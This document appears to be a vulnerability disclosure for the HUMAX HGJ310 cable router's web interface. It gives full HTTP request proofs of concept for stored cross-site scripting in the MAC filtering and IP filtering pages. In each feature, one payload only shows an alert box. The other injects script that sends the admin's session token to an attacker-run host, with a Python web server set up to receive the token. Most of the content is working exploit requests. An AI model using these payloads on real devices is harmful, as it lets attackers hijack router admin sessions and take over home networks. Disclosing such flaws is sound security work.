![image](https://user-images.githubusercontent.com/76706456/219898065-bcf22d5c-343a-4515-bcaa-af240bd28319.png)

<table border="1">
  <tr>
    <td>Vendor</td>
    <td>HUMAX Co., Ltd.</td>
  </tr>
  <tr>
    <td>Model</td>
    <td>HGJ310</td>
  </tr>
  <tr>
    <td>Technology</td>
    <td>DOCSIS 3.1</td>
  </tr>
  <tr>
    <td>Hardware version</td>
    <td>1.0</td>
  </tr>
  <tr>
    <td>Software version</td>
    <td>BRGCAI 1.0.69</td>
  </tr>
</table>

# Cross Site Scripting - MAC filtering feature

Locate: *Configurações avançadas > Menu > Segurança > Controle de acesso > Filtragem por MAC*

## Stored XSS

Concept Proof:
```
POST /api/v1/service/macFiltering HTTP/1.1
Host: 192.168.0.1
User-Agent: Firefox
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Access-Token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
X-Requested-With: XMLHttpRequest
Content-Length: 60
Connection: close

{"active":true,"macAddress":"<script>alert('xss')</script>"}
```

When accessing, the script is executed:

http://192.168.0.1/#page-security-mac-filtering

![image](https://user-images.githubusercontent.com/76706456/219894336-1c6cc1e9-93b9-4698-a210-875cf72bdbf9.png)

## Session Hijacking

Start web server:
```
python3 -m http.server 80
```

Concept Proof:
```
POST /api/v1/service/macFiltering HTTP/1.1
Host: 192.168.0.1
User-Agent: Firefox
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Access-Token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
X-Requested-With: XMLHttpRequest
Content-Length: 122
Connection: close

{"active":true,"macAddress":"<script> new Image().src='http://192.168.0.72/?='+sessionStorage.getItem('token');</script>"}
```

The client accesses and the session token is sent to the attacker:

http://192.168.0.1/#page-security-mac-filtering

![image](https://user-images.githubusercontent.com/76706456/219894409-48fa426e-b3aa-4cbd-b1f8-62271f5fe15f.png)

Python3 receiving session token:

![image](https://user-images.githubusercontent.com/76706456/219894439-7b772fc4-fa4d-497e-aa43-9f1fd8f33db5.png)

# Cross Site Scripting - IP filtering feature

Locate: *Configurações avançadas > Menu > Segurança > Controle de acesso > Filtragem por IP*

## Stored XSS

Concept Proof:
```
POST /api/v1/service/portIpFiltering HTTP/1.1
Host: 192.168.0.1
User-Agent: Firefox
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Access-Token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
X-Requested-With: XMLHttpRequest
Content-Length: 77
Connection: close

{"ipAddress":"<script>alert('xss')</script>","active":true,"protocol":"both"}
```

When accessing, the script is executed:

http://192.168.0.1/#page-security-ip-filtering

![image](https://user-images.githubusercontent.com/76706456/219894482-de659288-0041-413b-954c-cfc35aa634bd.png)

## Session Hijacking

Start web server:
```
python3 -m http.server 80
```

Concept Proof:
```
POST /api/v1/service/portIpFiltering HTTP/1.1
Host: 192.168.0.1
User-Agent: Firefox
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Access-Token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
X-Requested-With: XMLHttpRequest
Content-Length: 139
Connection: close

{"ipAddress":"<script> new Image().src='http://192.168.0.72/?='+sessionStorage.getItem('token');</script>","active":true,"protocol":"both"}
```

The client accesses and the session token is sent to the attacker:

http://192.168.0.1/#page-security-ip-filtering

![image](https://user-images.githubusercontent.com/76706456/219894562-b239f476-5b03-4bc9-aadb-60213067eb73.png)

Python3 receiving session token:

![image](https://user-images.githubusercontent.com/76706456/219894573-233d7075-9ced-44f0-bf2c-db94af54f157.png)
